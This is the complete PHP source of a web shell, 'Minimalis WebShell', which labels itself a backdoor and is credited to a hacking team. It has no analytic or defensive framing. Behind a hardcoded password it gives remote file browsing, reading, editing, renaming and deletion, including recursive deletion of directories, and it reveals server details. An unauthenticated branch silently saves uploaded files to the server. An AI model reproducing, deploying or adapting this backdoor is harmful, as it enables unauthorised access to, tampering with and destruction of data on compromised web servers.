<?php
/*
 Minimalis WebShell
 28 June 2019
 Coded by FilthyRoot - Sora Cyber Team
*/
 #error_reporting(0);
 session_start();
 $auth="root";
 function serverip(){
 	$ip1=$_SERVER['SERVER_ADDR'];
 	$ip2=gethostbyname($_SERVER['HTTP_HOST']);
 	if($ip1 == $ip2){
 		return $ip1;
 	}else{
 		return $ip2;
 	}
 }
 function login(){
 	global $auth;
 	echo "<title>Login - Minimalis</title>
 	<center>
 	<form action='' method='POST'>
 	Login to Minimalis.<br><br>
 	<input type='password' name='minim_pass' value='.....'>
 	</form>";
 	if(isset($_POST['minim_pass'])){
 		if($_POST['minim_pass'] == $auth){
 			$_SESSION['admin'] = "TRUE";
 			pindah('?home');
 		}else{
 			alert('Wrong Pass.');
 			pindah('?wrong');
 		}
 	}
 }
 function write($content,$dir){
 	$fh=fopen($dir,"w");
 	if(fwrite($fh,$content)){
 		return "1";
 	}else{
 		return "0";
 	}
 	fclose($fh);
 }
function delTree($dir){ 
$files = array_diff(scandir($dir), array('.', '..')); 
	foreach ($files as $file) { 
		(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
	}
	return rmdir($dir);
} 
function alert($msg){
	print "<script>alert('".$msg."');</script>";
}
function pindah($dir){
	print "<script>window.location='".$dir."';</script>";
}
if($_SESSION['admin'] == "TRUE"){
echo "<title>Minimalis Backdoor</title>
<style>
a{
	color:white;
	text-decoration:none;
}
a:hover{
	color:blue;
}
</style>
<body bgcolor='black'>
<font color='white'>
<link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
<center>";
$dir=$_GET['dir'];
if(!$dir){
	$dir=getcwd();
}
echo "Minimalis Backdoor<br><br>
</center>
<i class='fa fa-hdd-o'></i> ".php_uname()."<br>
<i class='fa fa-desktop'></i> ".serverip()." | <i class='fa fa-user'></i> ".$_SERVER['REMOTE_ADDR']."<br>
<i class='fa fa-folder-o'></i> ";
$a=explode("/",$dir);
foreach($a as $aa => $aaa){
	if($aaa == '' && $aa == '0'){
		echo "<a href='?dir=/'>/</a>";
		continue;
	}elseif($aaa == ''){
		continue;
	}else{
		echo "<a href='?dir=";
		for($i=0;$i<=$aa;$i++){
			echo $a[$i]."/";
		}
		echo "'>$aaa</a>/";
	}
}
echo "<br><br>
<a href='?home'>Home</a> | <a href='?nf&dir=$dir'>+File</a> | <a href='?nd&dir=$dir'>+Dir</a> | <a href='?exit'>Exit</a><br><br>";
if(isset($_GET['nf'])){
	echo "
	<form action='?nf&dir=$dir' method='POST'>
	New File : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if($_POST['fok']){
		pindah("?edit=$dir/".$_POST['fname']."&dir=$dir");
	}
}elseif(isset($_GET['nd'])){
	echo "
	<form action='?nd&dir=$dir' method='POST'>
	New Dir : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if($_POST['fok']){
		if(mkdir("$dir/".$_POST['fname']."")){
			pindah("?dir=$dir");
		}

	}
}elseif(isset($_GET['delf'])){
	if(delTree($_GET['delf'])){
		pindah("?dir=$dir");
	}else{
		alert('Failed.');
		pindah("?dir=$dir");
	}
}elseif(isset($_GET['renf'])){
	$now=$_GET['renf'];
	echo "
	<form action='?renf=$now&dir=$dir' method='POST'>
	New Name : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if(isset($_POST['fok'])){
		$new=$_POST['fname'];
		if(rename($now,"$dir/$new")){
			pindah("?dir=$dir");
		}else{
			alert('Failed.');
			pindah("?dir=$dir");
		}
	}
}elseif(isset($_GET['del'])){
	if(unlink($_GET['del'])){
		pindah("?dir=$dir");
	}else{
		alert('Failed.');
		pindah("?dir=$dir");
	}
}elseif(isset($_GET['exit'])){
	session_destroy();
	pindah('?home');
}elseif(isset($_GET['edit'])){
	$save=$_GET['edit'];
	$cont=htmlspecialchars(file_get_contents($save));
	echo "<form action='?edit=$save&$dir=$dir' method='POST'>
	<textarea name='fcont' cols=100% rows=30%>$cont</textarea><br><br>
	<input type='submit' name='fsave' value='Save'>
	</form>";
	if(isset($_POST['fsave'])){
		if(write($_POST['fcont'],$save) == "1"){
			pindah("?dir=$dir");
		}else{
			alert('Failed.');
			pindah("?dir=$dir");
		}
	}
}elseif(isset($_GET['src'])){
	$cont=$_GET['src'];
	print "<pre>".htmlspecialchars(file_get_contents($cont))."</pre>";
}else{
echo "
<table width='100%' style='color:white;' border='0' cellpadding='3' cellspacing='1' align='center'>
<tr>
<th width=80%>Name</th>
<th width=10%>Size</th>
<th width=10%>Action</th>
</tr>";
//scandir
$s=scandir($dir);
foreach($s as $fol){
	if($fol == "."){
		continue;
	}elseif($fol == ".."){
		print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir$fol/'>$fol</a></td><td></td><tr>";
	}else{
		if(is_dir("$dir/$fol") == TRUE){
			print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir$fol/'>$fol</a></td><td>Dir</td><td><a href='?delf=$dir$fol/&dir=$dir'>D</a> | <a href='?renf=$dir$fol/&dir=$dir'>R</a></td><tr>";
	}
}
}
foreach($s as $file){
	if($file == "." || $file == ".."){
		continue;
	}else{
		  $size=filesize("$dir/$file")/1024;
		  $size = round($size,3);
		  if($size >= 1024){
    	  	$size = round($size/1024,2).' MB';
    	  }else{
  			$size = $size.' KB';
  		}if(is_file("$dir/$file") == TRUE){
			print "<tr><td><i class='fa fa-file-o'></i> <a href='?src=$dir/$file&dir=$dir'>$file</a></td><td>$size</td><td><a href='?edit=$dir/$file&dir=$dir'>E</a> | <a href='?del=$dir/$file&dir=$dir'>D</a> | <a href='?renf=$dir/$file&dir=$dir'>R</a></td></tr>";
	}
}
}
print "</table><center>Coded by FilthyRoot";
}
}else{
	login();
	$name=$_FILES['s']['name'];
	$tmp=$_FILES['s']['tmp_name'];
	if(copy($tmp,$name)){}else{
		print "Coded by FilthyRoot.";
	}
}
?>